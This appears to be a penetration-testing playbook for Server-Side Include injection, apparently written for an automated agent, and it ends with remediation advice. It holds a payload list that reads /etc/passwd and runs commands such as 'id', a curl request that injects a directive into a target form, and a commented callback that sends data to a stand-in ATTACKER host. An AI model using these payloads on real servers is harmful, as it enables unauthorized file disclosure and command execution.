# SSI Injection Payloads

## Overview
Server-Side Includes (SSI) injection occurs when user input is interpreted by
an SSI-enabled web server, enabling data exposure or command execution.

## Prerequisites
```bash
# No special tools required
```

## Phase 1: Identify SSI Surfaces
```bash
# Common SSI-enabled file extensions
# .shtml .shtm .stm

# Check for SSI in response headers or templates
# Look for pages that appear to be server-side includes
```

## Phase 2: Payload List
```bash
cat > /workspace/output/TARGET_ssi_payloads.txt <<'PAYLOADS'
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#printenv -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="/etc/hosts" -->
<!--#exec cmd="id" -->
<!--#exec cmd="uname -a" -->
<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
PAYLOADS
```

## Phase 3: Test Examples
```bash
# Inject into fields that render in HTML (comments, profiles, templates)
TARGET_URL="https://TARGET/submit"

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "comment=<!--#echo var=\"DATE_LOCAL\" -->" \
  | tee /workspace/output/TARGET_ssi_test_1.txt
```

## Phase 4: OOB Verification (Optional)
```bash
# If exec is allowed, use a callback
# <!--#exec cmd="curl https://ATTACKER/ssi?u=$DOCUMENT_URI" -->
```

## Phase 5: Validation
```bash
# Check rendered output for evaluated SSI directives
# Confirm whether exec/include is permitted by server config
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] SSI directives executed
- [ ] Server info or files exposed
- [ ] Command execution via SSI

## Evidence
- Response: /workspace/output/TARGET_ssi_test_1.txt

## Recommendations
1. Disable SSI where not required
2. Treat user input as plain text (escape HTML)
3. Restrict exec/include directives via server config
```

## Output Files
- `/workspace/output/TARGET_ssi_payloads.txt` — payload list
- `/workspace/output/TARGET_ssi_test_1.txt` — test response

indicators: ssi injection, server side include, shtml injection, ssi payloads
